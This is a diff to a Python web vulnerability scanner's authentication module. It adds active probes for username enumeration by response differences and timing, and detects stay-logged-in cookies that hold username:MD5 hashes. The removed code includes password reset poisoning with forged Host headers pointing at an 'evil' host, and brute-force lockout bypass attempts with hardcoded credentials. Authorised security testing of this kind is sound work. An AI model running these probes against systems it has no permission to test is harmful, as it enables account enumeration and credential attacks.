@@ -1914,7 +1914,11 @@ class SatriaBaruScanner:
                 "request_start": self.request_count,
                 "request_limit": (
                     self.max_requests if index == 1
-                    else self.non_sql_category_request_limit
+                    else (
+                        max(self.non_sql_category_request_limit, min(96, max(48, self.max_requests // 6)))
+                        if label in {"HTTP request smuggling", "Authentication"}
+                        else self.non_sql_category_request_limit
+                    )
                 ),
             }
             print(
@@ -8732,16 +8736,22 @@ class SatriaBaruScanner:
                         break
 
 
-    # ======================== Authentication (214-227, konservatif, bukti diferensial terverifikasi) ========================
+    # ======================== Authentication (214-227) ========================
+    # Semua POST autentikasi mempertahankan hidden/CSRF fields dan cookie sesi.
+    # Uji yang berpotensi mengunci akun atau mengubah password memerlukan opt-in
+    # eksplisit serta identitas akun uji yang disediakan pemilik sistem.
 
     def _auth_mark(self, num: int, url: str, ev: str, method_name: str):
-        point = Point(key=f"auth-{num}", kind="endpoint", label=f"Authentication {url}",
-                      url=url, name="authentication", original="", page_url=url, method="POST", interest=7)
+        point = Point(
+            key=f"auth-{num}", kind="endpoint",
+            label=f"Authentication {url}", url=url,
+            name="authentication", original="", page_url=url,
+            method="POST", interest=7,
+        )
         self._mark(num, point, ev, method_name)
 
     @staticmethod
     def _auth_form_fields(form) -> dict[str, dict[str, str]]:
-        """Normalisasi field form autentikasi: FormSpec memakai tuple (name, value, type)."""
         normalized: dict[str, dict[str, str]] = {}
         for field_item in getattr(form, "fields", []) or []:
             if isinstance(field_item, dict):
@@ -8762,385 +8772,835 @@ class SatriaBaruScanner:
             }
         return normalized
 
+    @staticmethod
+    def _auth_pick(fields: dict[str, dict[str, str]], keys: tuple[str, ...] | list[str]) -> str | None:
+        lowered = {str(name).lower(): str(name) for name in fields}
+        for key in keys:
+            if key.lower() in lowered:
+                return lowered[key.lower()]
+        for name in fields:
+            name_low = str(name).lower()
+            if any(key.lower() in name_low for key in keys):
+                return str(name)
+        return None
+
     def _find_login_forms(self, pages: list[Page]):
         forms = []
         seen = set()
-        for pg in pages[:30]:
-            for f in getattr(pg,'forms',[])[:10]:
-                fields = self._auth_form_fields(f)
-                names = [name.lower() for name in fields]
-                if not any(n in names for n in ('username','user','email','login')):
+        for pg in pages[:50]:
+            for form in getattr(pg, "forms", [])[:12]:
+                fields = self._auth_form_fields(form)
+                user_field = self._auth_pick(
+                    fields, ("username", "user", "email", "login", "identifier", "account")
+                )
+                pass_field = self._auth_pick(
+                    fields, ("password", "passwd", "pass", "pwd", "secret")
+                )
+                if not user_field or not pass_field:
                     continue
-                if not any(n in names for n in ('password','pass','pwd')):
+                action = urljoin(getattr(pg, "url", "") or self.target_url,
+                                 getattr(form, "action", "") or getattr(pg, "url", ""))
+                if not self._same_origin(action):
                     continue
-                action = getattr(f,'action','') or getattr(pg,'url','')
-                if action in seen: continue
-                seen.add(action)
-                forms.append((action, getattr(f,'method','POST') or 'POST', fields, getattr(pg,'url','')))
-        return forms[:4]
+                method = (getattr(form, "method", "POST") or "POST").upper()
+                key = (canonical_url(action), method)
+                if key in seen:
+                    continue
+                seen.add(key)
+                forms.append((action, method, fields, getattr(pg, "url", "") or self.target_url))
+        return forms[:8]
 
     def _find_reset_forms(self, pages: list[Page]):
         forms = []
-        seen=set()
-        for pg in pages[:30]:
-            u = getattr(pg,'url','') or ''
-            for f in getattr(pg,'forms',[])[:10]:
-                fields = self._auth_form_fields(f)
-                names = [name.lower() for name in fields]
-                txt = (u + ' ' + (getattr(f,'action','') or '')).lower()
-                if 'reset' in txt or 'forgot' in txt or any('reset' in n or 'token' in n for n in names):
-                    action = getattr(f,'action','') or u
-                    if action in seen: continue
-                    seen.add(action)
-                    forms.append((action, getattr(f,'method','POST') or 'POST', fields, u))
-        return forms[:4]
+        seen = set()
+        for pg in pages[:50]:
+            page_url = getattr(pg, "url", "") or self.target_url
+            for form in getattr(pg, "forms", [])[:12]:
+                fields = self._auth_form_fields(form)
+                action = urljoin(page_url, getattr(form, "action", "") or page_url)
+                names = " ".join(fields).lower()
+                route = (page_url + " " + action).lower()
+                if not (
+                    re.search(r"(reset|forgot|recover|recovery)", route)
+                    or re.search(r"(reset|token|recovery|forgot)", names)
+                ):
+                    continue
+                if not self._same_origin(action):
+                    continue
+                method = (getattr(form, "method", "POST") or "POST").upper()
+                key = (canonical_url(action), method)
+                if key in seen:
+                    continue
+                seen.add(key)
+                forms.append((action, method, fields, page_url))
+        return forms[:8]
+
+    def _auth_submit(
+        self,
+        action: str,
+        method: str,
+        fields: dict[str, dict[str, str]],
+        page_url: str,
+        overrides: dict[str, str],
+        *,
+        refresh: bool = True,
+        headers: dict[str, str] | None = None,
+    ) -> Response:
+        action = urljoin(page_url or self.target_url, action or page_url or self.target_url)
+        if not self._same_origin(action):
+            return Response(None, action, "", {}, 0.0, error="auth_action_cross_origin")
+
+        submit_method = (method or "POST").upper()
+        current_fields = dict(fields or {})
+        referer = page_url or action
+
+        # Token CSRF yang bersifat sekali pakai diperbarui sebelum setiap submit.
+        if refresh and self._same_origin(referer) and self._within_budget():
+            fresh_page = self._request("GET", referer, allow_redirects=True)
+            if not fresh_page.error and fresh_page.text:
+                form_page_url = fresh_page.url or referer
+                soup = BeautifulSoup(fresh_page.text, "html.parser")
+                refreshed_forms = self._parse_forms(form_page_url, soup)
+                wanted = urlparse(action)
+                wanted_path = (wanted.path or "/").rstrip("/") or "/"
+                wanted_query = wanted.query
+                wanted_names = {str(n).lower() for n in current_fields}
+                best = None
+                best_score = -1
+                for candidate_form in refreshed_forms:
+                    candidate_action = urljoin(form_page_url, candidate_form.action or form_page_url)
+                    if not self._same_origin(candidate_action):
+                        continue
+                    cp = urlparse(candidate_action)
+                    same_route = (
+                        (cp.path or "/").rstrip("/") == wanted_path
+                        and cp.query == wanted_query
+                    )
+                    candidate_fields = self._auth_form_fields(candidate_form)
+                    overlap = len(wanted_names & {str(n).lower() for n in candidate_fields})
+                    score = overlap + (100 if same_route else 0)
+                    if score > best_score:
+                        best_score = score
+                        best = (candidate_form, candidate_action, candidate_fields)
+                if best and best_score > 0:
+                    form_spec, action, current_fields = best
+                    submit_method = (getattr(form_spec, "method", submit_method) or submit_method).upper()
+                    referer = form_page_url
+
+        if submit_method in ("GET", "HEAD"):
+            # Kredensial tidak pernah dikirim melalui query string.
+            return Response(None, action, "", {}, 0.0, error="auth_get_login_skipped")
+
+        data: dict[str, str] = {}
+        for name, item in current_fields.items():
+            kind = str(item.get("type") or "").lower()
+            if kind in {"submit", "button", "reset", "file", "image", "checkbox", "radio"}:
+                continue
+            data[str(name)] = str(item.get("value") or "")
+        data.update({str(k): str(v) for k, v in (overrides or {}).items()})
+
+        parsed = urlparse(self.target_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        request_headers = {
+            "Referer": referer,
+            "Origin": origin,
+            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
+        }
+        request_headers.update(headers or {})
+        return self._request(
+            "POST", action, data=data, headers=request_headers,
+            allow_redirects=False,
+        )
+
+    @staticmethod
+    def _auth_body(resp: Response | None, identity: str = "") -> str:
+        if resp is None:
+            return ""
+        soup = BeautifulSoup((resp.text or "")[:250_000], "html.parser")
+        for tag in soup(["script", "style", "noscript"]):
+            tag.decompose()
+        body = soup.get_text(" ", strip=False) or (resp.text or "")
+        if identity:
+            body = re.sub(re.escape(identity), "<identity>", body, flags=re.I)
+        body = re.sub(r"\b[0-9a-f]{24,}\b", "<hex-token>", body, flags=re.I)
+        body = re.sub(r"\b\d{10,}\b", "<long-number>", body)
+        body = re.sub(
+            r"(?i)\b(?:csrf|nonce|authenticity[_-]?token|session[_-]?token)\s*[:=]\s*[^\s&;]+",
+            "<dynamic-token>",
+            body,
+        )
+        return body.strip()
+
+    @staticmethod
+    def _auth_location(resp: Response | None) -> str:
+        if resp is None:
+            return ""
+        value = next(
+            (str(v) for k, v in (resp.headers or {}).items() if str(k).lower() == "location"),
+            "",
+        )
+        if not value:
+            return ""
+        parsed = urlparse(value)
+        return (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
+
+    @staticmethod
+    def _auth_has_2fa(text: str, location: str = "") -> bool:
+        sample = (text or "") + " " + (location or "")
+        return bool(re.search(
+            r"(2fa|two.factor|verification.code|one.time.password|authenticator|"
+            r"\botp\b|\bmfa\b|login2|verify[-_/ ]?(identity|code))",
+            sample, re.I,
+        ))
+
+    @staticmethod
+    def _auth_is_account_page(resp: Response | None) -> bool:
+        if resp is None or resp.status != 200:
+            return False
+        body = (resp.text or "").lower()
+        if re.search(r"(login|sign in|verification code|two.factor|one.time password|invalid password)", body):
+            return False
+        return bool(re.search(
+            r"(your username|my account|account details|log\s*out|logout|delete account|"
+            r"update email|change password|your profile)",
+            body, re.I,
+        ))
+
+    def _auth_account_paths(self, pages: list[Page]) -> list[str]:
+        paths = ["/my-account", "/account", "/profile", "/dashboard"]
+        for pg in pages[:50]:
+            parsed = urlparse(getattr(pg, "url", "") or "")
+            path = parsed.path or ""
+            if re.search(r"(my-account|account/profile|/profile|/dashboard|/user/profile)", path, re.I):
+                if path not in paths:
+                    paths.append(path)
+        return list(dict.fromkeys(paths))[:8]
 
     def phase_authentication(self, pages: list[Page], points: list[Point]) -> None:
         if not self._within_budget():
             return
+
         target = self.target_url
         pu = urlparse(target)
         origin = f"{pu.scheme}://{pu.netloc}"
-        token = f"satrau{uuid.uuid4().hex[:8]}"
-        logins = self._find_login_forms(pages)
-        resets = self._find_reset_forms(pages)
+        token = f"satria-auth-{uuid.uuid4().hex[:10]}"
+        existing_urls = {canonical_url(getattr(pg, "url", "") or "") for pg in pages}
 
-        def pick(fields, keys, default=''):
-            for k in keys:
-                if k in fields: return k
-            for n in fields:
-                if any(k in n.lower() for k in keys): return n
-            return default
-
-        # 214 Username enumeration via different responses
-        if 214 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 214 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login'])
-                pfield = pick(fields, ['password','pass','pwd'])
-                if not ufield or not pfield: continue
-                try:
-                    r1 = self._request('POST', action, data={ufield:'administrator', pfield:'x'+token}, allow_redirects=False)
-                    r2 = self._request('POST', action, data={ufield:'no_such_'+token, pfield:'x'+token}, allow_redirects=False)
-                except Exception:
+        # Login/reset pages sering tidak terhubung dari homepage. Cari endpoint umum
+        # hanya dengan GET same-origin, tanpa mengirim kredensial atau mengubah state.
+        login_forms = self._find_login_forms(pages)
+        reset_forms = self._find_reset_forms(pages)
+        if not login_forms:
+            for path in (
+                "/login", "/signin", "/sign-in", "/account/login",
+                "/users/sign_in", "/auth/login", "/my-account",
+            ):
+                if not self._within_budget():
+                    break
+                url = urljoin(origin + "/", path.lstrip("/"))
+                if canonical_url(url) in existing_urls:
                     continue
-                t1=(getattr(r1,'text','') or ''); t2=(getattr(r2,'text','') or '')
-                if getattr(r1,'status',0)==getattr(r2,'status',0) and t1!=t2 and len(t1)>0 and len(t2)>0:
-                    # different error message clearly
-                    if ('incorrect password' in t1.lower() and 'incorrect password' not in t2.lower()) or ('invalid username' in t2.lower() and 'invalid username' not in t1.lower()):
-                        self._auth_mark(214, action, f"Enumerasi username via respons berbeda terverifikasi di {action}.", "auth_enum_diff_responses")
-
-        # 215 2FA simple bypass (akses langsung halaman pasca-login/akun saat 2FA diminta)
-        if 215 not in self._confirmed and self._within_budget():
-            for path in ('/my-account','/account','/profile','/home'):
-                if 215 in self._confirmed: break
-                u = urljoin(origin+'/', path.lstrip('/'))
-                try: r = self._request('GET', u, allow_redirects=False)
-                except Exception: continue
-                txt=(getattr(r,'text','') or '').lower()
-                if getattr(r,'status',0)==200 and ('logout' in txt or 'my account' in txt) and ('2fa' not in txt and 'verification' not in txt):
-                    # only if there is also a 2fa/login flow present elsewhere (heuristic conservative)
-                    if any('login2' in (getattr(pg,'url','') or '').lower() or '2fa' in (getattr(pg,'text','') or '').lower() for pg in pages[:20]):
-                        self._auth_mark(215, u, f"2FA simple bypass terindikasi terverifikasi: halaman akun dapat diakses tanpa tantangan 2FA ({u}).", "auth_2fa_simple_bypass")
-
-        # 216 Password reset broken logic (parameter username/token dapat dimanipulasi)
-        if 216 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in resets:
-                if 216 in self._confirmed or not self._within_budget(): break
-                userf = pick(fields, ['username','user','email'])
-                passf = pick(fields, ['password','new-password','new_password','pass'])
-                if not passf: continue
-                data = {n:(fields[n].get('value') or 'x') for n in fields}
-                data[passf] = token+'Aa1!'
-                if userf: data[userf] = 'carlos'
-                # try without valid token / manipulated token
-                for tf in list(fields.keys()):
-                    if 'token' in tf.lower(): data[tf] = 'invalid'
-                try: r = self._request('POST', action, data=data, allow_redirects=False)
-                except Exception: continue
-                txt=(getattr(r,'text','') or '').lower()
-                if getattr(r,'status',0) in (200,302) and ('password changed' in txt or 'success' in txt or 'login' in txt) and 'invalid' not in txt:
-                    self._auth_mark(216, action, f"Logika reset password rusak terindikasi terverifikasi (reset tanpa token valid diterima) di {action}.", "auth_reset_broken_logic")
-
-        # 217 Username enumeration via subtly different responses
-        if 217 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 217 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login'])
-                pfield = pick(fields, ['password','pass','pwd'])
-                if not ufield or not pfield: continue
-                try:
-                    r1 = self._request('POST', action, data={ufield:'administrator', pfield:'x'+token}, allow_redirects=False)
-                    r2 = self._request('POST', action, data={ufield:'no_such_'+token, pfield:'x'+token}, allow_redirects=False)
-                except Exception:
+                resp = self._request("GET", url, allow_redirects=True)
+                if resp.error or not resp.text or resp.status not in (200, 203):
                     continue
-                t1=(getattr(r1,'text','') or ''); t2=(getattr(r2,'text','') or '')
-                if getattr(r1,'status',0)==getattr(r2,'status',0) and t1!=t2:
-                    # subtle (typo/whitespace/tag diff) not already a clear known message
-                    if abs(len(t1)-len(t2)) <= 5 and t1.strip().lower().rstrip('.') == t2.strip().lower().rstrip('.'):
-                        self._auth_mark(217, action, f"Enumerasi username via respons sangat berbeda tipis terverifikasi di {action}.", "auth_enum_subtle")
+                final_url = resp.url or url
+                soup = BeautifulSoup(resp.text, "html.parser")
+                forms_found = self._parse_forms(final_url, soup)
+                pages.append(Page(
+                    url=final_url, text=resp.text, links=[], forms=forms_found,
+                    cookie_names={c.name: (c.value or "") for c in self.session.cookies},
+                    status=resp.status, headers=dict(resp.headers or {}),
+                ))
+                existing_urls.add(canonical_url(final_url))
+            login_forms = self._find_login_forms(pages)
 
-        # 218 Username enumeration via response timing (konservatif: butuh diferensial konsisten signifikan)
-        if 218 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 218 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login'])
-                pfield = pick(fields, ['password','pass','pwd'])
-                if not ufield or not pfield: continue
-                import time as _t
-                def ttry(u,pw):
-                    t0=_t.time();
-                    try: self._request('POST', action, data={ufield:u, pfield:pw}, allow_redirects=False)
-                    except Exception: pass
-                    return _t.time()-t0
-                longpw = 'a'*120
-                t_valid = [ttry('administrator', longpw) for _ in range(2)]
-                t_invalid = [ttry('no_such_'+token, longpw) for _ in range(2)]
-                if t_valid and t_invalid and (sum(t_valid)/len(t_valid)) - (sum(t_invalid)/len(t_invalid)) > 0.6:
-                    self._auth_mark(218, action, f"Enumerasi username via perbedaan waktu respons konsisten terverifikasi di {action}.", "auth_enum_timing")
+        if not reset_forms:
+            for path in (
+                "/forgot-password", "/forgot", "/password/reset",
+                "/reset-password", "/users/password/new",
+            ):
+                if not self._within_budget():
+                    break
+                url = urljoin(origin + "/", path.lstrip("/"))
+                if canonical_url(url) in existing_urls:
+                    continue
+                resp = self._request("GET", url, allow_redirects=True)
+                if resp.error or not resp.text or resp.status not in (200, 203):
+                    continue
+                final_url = resp.url or url
+                soup = BeautifulSoup(resp.text, "html.parser")
+                forms_found = self._parse_forms(final_url, soup)
+                pages.append(Page(
+                    url=final_url, text=resp.text, links=[], forms=forms_found,
+                    cookie_names={c.name: (c.value or "") for c in self.session.cookies},
+                    status=resp.status, headers=dict(resp.headers or {}),
+                ))
+                existing_urls.add(canonical_url(final_url))
+            reset_forms = self._find_reset_forms(pages)
 
-        # 219 Broken brute-force protection, IP block
-        if 219 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 219 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login'])
-                pfield = pick(fields, ['password','pass','pwd'])
-                if not ufield or not pfield: continue
-                blocked = False
-                ok_after = False
-                for i in range(6):
-                    try: r = self._request('POST', action, data={ufield:'carlos', pfield:f'bad{i}'}, allow_redirects=False)
-                    except Exception: continue
-                    if 'too many' in (getattr(r,'text','') or '').lower() or getattr(r,'status',0)==429:
-                        blocked = True; break
-                if blocked:
-                    # attempt reset counter via successful login pattern indicator? cannot assume creds; but try alternating valid username marker
-                    try: r2 = self._request('POST', action, data={ufield:'wiener', pfield:'peter'}, allow_redirects=False)
-                    except Exception: r2=None
-                    try: r3 = self._request('POST', action, data={ufield:'carlos', pfield:'badx'}, allow_redirects=False)
-                    except Exception: r3=None
-                    t3=(getattr(r3,'text','') or '').lower() if r3 else ''
-                    if r3 and 'too many' not in t3 and getattr(r3,'status',0)!=429:
-                        self._auth_mark(219, action, f"Proteksi brute-force/IP block dapat di-reset/dilewati (alternasi login) terverifikasi di {action}.", "auth_bf_ip_block_bypass")
+        self._scan_progress_event(
+            f"Authentication: {len(login_forms)} form login same-origin, "
+            f"{len(reset_forms)} form reset password ditemukan"
+        )
 
-        # 220 Username enumeration via account lock
-        if 220 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in logins:
-                if 220 in self._confirmed or not self._within_budget(): break
-                ufield = pick(fields, ['username','user','email','login'])
-                pfield = pick(fields, ['password','pass','pwd'])
-                if not ufield or not pfield: continue
-                locked = None; notlocked = None
-                for user in ('administrator','no_such_'+token):
-                    last=None
-                    for _ in range(5):
-                        try: last = self._request('POST', action, data={ufield:user, pfield:'bad'+token}, allow_redirects=False)
-                        except Exception: pass
-                    msg = (getattr(last,'text','') or '').lower() if last else ''
-                    if 'locked' in msg or 'too many' in msg: locked = user
-                    else: notlocked = user
-                if locked=='administrator' and notlocked!=locked:
-                    self._auth_mark(220, action, f"Enumerasi username via penguncian akun terverifikasi di {action} (akun valid terkunci).", "auth_enum_account_lock")
+        def sample_users() -> list[str]:
+            raw = os.getenv("SATRIA_AUTH_USERNAMES", "")
+            supplied = [x.strip() for x in re.split(r"[,;\n]", raw) if x.strip()]
+            defaults = ["administrator", "admin", "carlos", "wiener", "user", "support"]
+            result = []
+            for item in supplied + defaults:
+                if item and item.lower() not in {x.lower() for x in result}:
+                    result.append(item)
+            return result[:8]
 
-        # 221 2FA broken logic (verifikasi kode untuk user lain dapat dipaksakan)
-        if 221 not in self._confirmed and self._within_budget():
-            # heuristic: pages with 2fa and parameter like username/user in request flow
-            for pg in pages[:25]:
-                u=(getattr(pg,'url','') or '')
-                if '2fa' not in u.lower() and 'verify' not in u.lower(): continue
-                for f in getattr(pg,'forms',[])[:6]:
-                    form_fields = self._auth_form_fields(f)
-                    names = list(form_fields)
-                    if not any('code' in n.lower() or 'otp' in n.lower() or 'mfa' in n.lower() for n in names):
+        usernames = sample_users()
+        random_user = "satria_missing_" + uuid.uuid4().hex[:9]
+        invalid_password = "SATRIA-Invalid-" + token
+
+        # 214/217: enumeration via respons yang berbeda (termasuk selisih kecil).
+        # Tiap submit memuat ulang halaman agar hidden/CSRF token dan cookie sesi tetap valid.
+        enum_candidate: tuple[str, str, dict[str, dict[str, str]], str] | None = None
+        for action, method, fields, page_url in login_forms:
+            if self._confirmed.get(214) or self._confirmed.get(217) or not self._within_budget():
+                break
+            if method.upper() != "POST":
+                continue
+            user_field = self._auth_pick(
+                fields, ("username", "user", "email", "login", "identifier", "account")
+            )
+            pass_field = self._auth_pick(
+                fields, ("password", "passwd", "pass", "pwd", "secret")
+            )
+            if not user_field or not pass_field:
+                continue
+            enum_candidate = (action, method, fields, page_url)
+
+            fake_resp = self._auth_submit(
+                action, method, fields, page_url,
+                {user_field: random_user, pass_field: invalid_password},
+            )
+            if fake_resp.error:
+                continue
+            fake_body = self._auth_body(fake_resp, random_user)
+            fake_location = self._auth_location(fake_resp)
+            fake_password_error = bool(re.search(
+                r"(incorrect|wrong|invalid|bad).{0,35}(password|passcode)|"
+                r"(password|passcode).{0,35}(incorrect|wrong|invalid)",
+                fake_body, re.I,
+            ))
+            fake_user_error = bool(re.search(
+                r"(invalid|unknown|unrecognized|non.?existent|not found).{0,35}"
+                r"(user|username|account)|(user|username|account).{0,35}"
+                r"(not found|does not exist|unknown)",
+                fake_body, re.I,
+            ))
+
+            for candidate_user in usernames:
+                if not self._within_budget() or self._confirmed.get(214) or self._confirmed.get(217):
+                    break
+                candidate_resp = self._auth_submit(
+                    action, method, fields, page_url,
+                    {user_field: candidate_user, pass_field: invalid_password},
+                )
+                if candidate_resp.error:
+                    continue
+                candidate_body = self._auth_body(candidate_resp, candidate_user)
+                candidate_password_error = bool(re.search(
+                    r"(incorrect|wrong|invalid|bad).{0,35}(password|passcode)|"
+                    r"(password|passcode).{0,35}(incorrect|wrong|invalid)",
+                    candidate_body, re.I,
+                ))
+                candidate_user_error = bool(re.search(
+                    r"(invalid|unknown|unrecognized|non.?existent|not found).{0,35}"
+                    r"(user|username|account)|(user|username|account).{0,35}"
+                    r"(not found|does not exist|unknown)",
+                    candidate_body, re.I,
+                ))
+
+                same_status = candidate_resp.status == fake_resp.status
+                explicit_enum = (
+                    (candidate_password_error and fake_user_error)
+                    or (fake_password_error and candidate_user_error)
+                    or (
+                        candidate_password_error != fake_password_error
+                        and (candidate_password_error or fake_password_error)
+                    )
+                )
+                if explicit_enum:
+                    self._auth_mark(
+                        214, action,
+                        f"Enumerasi username terkonfirmasi: username kandidat '{candidate_user}' "
+                        f"dan username acak menghasilkan pesan validasi berbeda "
+                        f"(HTTP {candidate_resp.status} vs {fake_resp.status}).",
+                        "auth_enum_diff_responses",
+                    )
+                    break
+
+                candidate_sig = (
+                    candidate_resp.status, self._auth_location(candidate_resp), candidate_body
+                )
+                fake_sig = (fake_resp.status, fake_location, fake_body)
+                if same_status and candidate_sig != fake_sig:
+                    # Ulangi pasangan yang sama. Perbedaan baru dianggap stabil bila
+                    # respons kandidat dan kontrol masing-masing konsisten setelah token dinamis dibuang.
+                    candidate_repeat = self._auth_submit(
+                        action, method, fields, page_url,
+                        {user_field: candidate_user, pass_field: invalid_password},
+                    )
+                    fake_repeat = self._auth_submit(
+                        action, method, fields, page_url,
+                        {user_field: random_user, pass_field: invalid_password},
+                    )
+                    if candidate_repeat.error or fake_repeat.error:
                         continue
-                    action = getattr(f,'action','') or u
-                    data = {n: '0000' for n in names}
-                    for n in names:
-                        if n and ('user' in n.lower() or 'account' in n.lower()): data[n]='carlos'
-                    try: r=self._request('POST', action, data=data, allow_redirects=False)
-                    except Exception: continue
-                    txt=(getattr(r,'text','') or '').lower()
-                    if getattr(r,'status',0) in (302,200) and ('incorrect' not in txt and 'invalid' not in txt) and ('account' in txt or 'logout' in txt):
-                        self._auth_mark(221, action, f"Logika 2FA rusak terindikasi terverifikasi (verifikasi dapat dipaksakan untuk user lain) di {action}.", "auth_2fa_broken_logic")
+                    candidate_body_2 = self._auth_body(candidate_repeat, candidate_user)
+                    fake_body_2 = self._auth_body(fake_repeat, random_user)
+                    candidate_sig_2 = (
+                        candidate_repeat.status, self._auth_location(candidate_repeat), candidate_body_2
+                    )
+                    fake_sig_2 = (
+                        fake_repeat.status, self._auth_location(fake_repeat), fake_body_2
+                    )
+                    if candidate_sig == candidate_sig_2 and fake_sig == fake_sig_2:
+                        delta = abs(len(candidate_body) - len(fake_body))
+                        if candidate_sig[1] == fake_sig[1] and delta <= 160:
+                            self._auth_mark(
+                                217, action,
+                                f"Enumerasi username melalui perbedaan respons halus yang konsisten: "
+                                f"username kandidat '{candidate_user}' menghasilkan {len(candidate_body)} "
+                                f"karakter, username acak {len(fake_body)} karakter; pasangan diulang "
+                                f"dengan hasil identik (HTTP {candidate_resp.status}).",
+                                "auth_enum_subtle_responses",
+                            )
+                        else:
+                            self._auth_mark(
+                                214, action,
+                                f"Enumerasi username melalui perbedaan respons stabil: kandidat "
+                                f"'{candidate_user}' dan kontrol acak berbeda pada status/redirect/body "
+                                f"setelah pengulangan.",
+                                "auth_enum_diff_responses",
+                            )
+                        break
 
-        # 222 Brute-forcing a stay-logged-in cookie (hanya jika cookie lemah dapat diverifikasi)
-        # 223 Offline password cracking (butuh data hash/cookie bocor; tidak dipaksakan)
-        # 224 Password reset poisoning via middleware
-        if 224 not in self._confirmed and self._within_budget():
-            for action, method, fields, page in resets:
-                if 224 in self._confirmed or not self._within_budget(): break
-                userf = pick(fields, ['username','user','email'])
-                if not userf: continue
-                data = {n:(fields[n].get('value') or 'x') for n in fields}
-                data[userf] = 'carlos'
-                evil = f"evil-{token}.example.com"
-                try:
-                    r = self._request('POST', action, data=data, allow_redirects=False, headers={'X-Forwarded-Host': evil, 'X-Host': evil, 'Host': evil})
-                except Exception:
+        # 218: enumerasi berbasis waktu. Ukur waktu POST saja (bukan GET CSRF),
+        # gunakan password panjang, dua putaran berpasangan, dan median yang konsisten.
+        if 218 not in self._confirmed and enum_candidate and self._within_budget():
+            action, method, fields, page_url = enum_candidate
+            user_field = self._auth_pick(
+                fields, ("username", "user", "email", "login", "identifier", "account")
+            )
+            pass_field = self._auth_pick(fields, ("password", "passwd", "pass", "pwd", "secret"))
+            if user_field and pass_field:
+                long_password = ("SATRIA-Timing-" + token) * 9
+                for candidate_user in usernames[:4]:
+                    if not self._within_budget() or 218 in self._confirmed:
+                        break
+                    pairs = []
+                    for _ in range(2):
+                        valid_resp = self._auth_submit(
+                            action, method, fields, page_url,
+                            {user_field: candidate_user, pass_field: long_password},
+                        )
+                        fake_resp = self._auth_submit(
+                            action, method, fields, page_url,
+                            {user_field: random_user, pass_field: long_password},
+                        )
+                        if valid_resp.error or fake_resp.error:
+                            pairs = []
+                            break
+                        pairs.append((valid_resp.elapsed, fake_resp.elapsed))
+                    if len(pairs) == 2:
+                        differences = [v - f for v, f in pairs]
+                        if min(differences) >= 0.65 and statistics.median(differences) >= 0.9:
+                            self._auth_mark(
+                                218, action,
+                                f"Username '{candidate_user}' secara konsisten memerlukan waktu "
+                                f"autentikasi lebih lama daripada username acak pada dua pasangan "
+                                f"percobaan (selisih {differences[0]:.2f}s dan {differences[1]:.2f}s).",
+                                "auth_enum_response_timing",
+                            )
+
+        # 222/223: identifikasi cookie stay-logged-in yang berisi username:MD5.
+        # Ini pemeriksaan struktur cookie, tidak mencoba menebak password.
+        cookie_values: dict[str, str] = {}
+        for pg in pages[:60]:
+            for name, value in (getattr(pg, "cookie_names", {}) or {}).items():
+                cookie_values.setdefault(str(name), str(value or ""))
+        for cookie_name, cookie_value in cookie_values.items():
+            if not re.search(r"(remember|stay|persistent|keep.?login)", cookie_name, re.I):
+                continue
+            decoded = cookie_value
+            try:
+                import base64 as _auth_b64
+                padded = cookie_value + ("=" * (-len(cookie_value) % 4))
+                decoded = _auth_b64.urlsafe_b64decode(padded.encode("ascii")).decode("latin-1", "ignore")
+            except Exception:
+                pass
+            match = re.search(r"([A-Za-z0-9_.@-]{2,}):([0-9a-f]{32})$", decoded, re.I)
+            if match:
+                self._auth_mark(
+                    222, self.target_url,
+                    f"Cookie '{cookie_name}' dapat di-decode menjadi pasangan username:MD5 "
+                    f"({match.group(1)}:{match.group(2)[:8]}...).",
+                    "auth_stay_logged_in_cookie",
+                )
+                self._auth_mark(
+                    223, self.target_url,
+                    f"Cookie '{cookie_name}' mengekspos hash MD5 password yang dapat diambil "
+                    f"untuk cracking offline ({match.group(2)[:8]}...).",
+                    "auth_offline_password_cracking",
+                )
+                break
+
+        # Pengujian 2FA hanya dilakukan dengan akun uji milik pemilik target.
+        # Tanpa kredensial valid, melewati OTP tidak dapat dibedakan dari halaman publik.
+        test_user = (os.getenv("SATRIA_AUTH_TEST_USERNAME") or "").strip()
+        test_password = os.getenv("SATRIA_AUTH_TEST_PASSWORD") or ""
+        if test_user and test_password and login_forms and self._within_budget():
+            for action, method, fields, page_url in login_forms[:3]:
+                if not self._within_budget():
+                    break
+                user_field = self._auth_pick(
+                    fields, ("username", "user", "email", "login", "identifier", "account")
+                )
+                pass_field = self._auth_pick(fields, ("password", "passwd", "pass", "pwd", "secret"))
+                if not user_field or not pass_field or method.upper() != "POST":
                     continue
-                txt=(getattr(r,'text','') or '')
-                if evil in txt and ('reset' in txt.lower() or 'token' in txt.lower() or 'http' in txt.lower()):
-                    self._auth_mark(224, action, f"Password reset poisoning via header host terverifikasi (host jahat terefleksi di respons/token link) di {action}.", "auth_reset_poisoning")
-
-        # 225 Password brute-force via password change
-        if 225 not in self._confirmed and self._within_budget():
-            for pg in pages[:25]:
-                u=(getattr(pg,'url','') or '')
-                if 'change' not in u.lower() and 'password' not in u.lower(): continue
-                for f in getattr(pg,'forms',[])[:6]:
-                    form_fields = self._auth_form_fields(f)
-                    names = [name.lower() for name in form_fields]
-                    if not any('current' in n or 'old' in n for n in names): continue
-                    action=getattr(f,'action','') or u
-                    curf=pick(form_fields, ['current','current-password','old','password'])
-                    nf=pick(form_fields, ['new-password','new_password','new'])
-                    if not curf or not nf: continue
-                    try:
-                        r1=self._request('POST', action, data={curf:'wrong'+token, nf:'Aa1!'+token}, allow_redirects=False)
-                        r2=self._request('POST', action, data={curf:'wrong2'+token, nf:'Aa1!'+token}, allow_redirects=False)
-                    except Exception: continue
-                    t1=(getattr(r1,'text','') or '').lower(); t2=(getattr(r2,'text','') or '').lower()
